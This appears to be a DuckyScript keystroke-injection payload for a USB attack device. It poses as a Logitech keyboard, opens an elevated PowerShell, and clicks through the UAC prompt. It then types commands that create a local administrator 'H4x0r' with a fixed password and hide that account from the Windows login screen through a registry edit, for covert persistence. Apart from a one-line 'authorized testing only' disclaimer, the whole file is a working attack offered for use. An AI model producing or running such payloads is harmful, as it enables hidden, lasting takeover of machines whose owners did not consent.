REM Title: Add Hidden Admin User
REM Author: Community
REM Target: Windows 10/11 (requires admin privileges on target)
REM Description: Creates a hidden local admin account for persistence
REM AUTHORIZED PENETRATION TESTING ONLY
REM
REM EDIT USERNAME AND PASSWORD BEFORE USE
REM
ID 046D:C31C Logitech USB Keyboard

DELAY 1500

REM Open elevated PowerShell
GUI x
DELAY 500
STRING a
DELAY 1000

REM If UAC prompt appears, handle it
ALT y
DELAY 1000

REM CHANGE username and password below
STRING net user H4x0r P@ssw0rd123! /add
ENTER
DELAY 500
STRING net localgroup administrators H4x0r /add
ENTER
DELAY 500
STRING net user H4x0r /active:yes
ENTER
DELAY 500
REM Hide from login screen
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v H4x0r /t REG_DWORD /d 0 /f
ENTER
DELAY 1000
STRING exit
ENTER
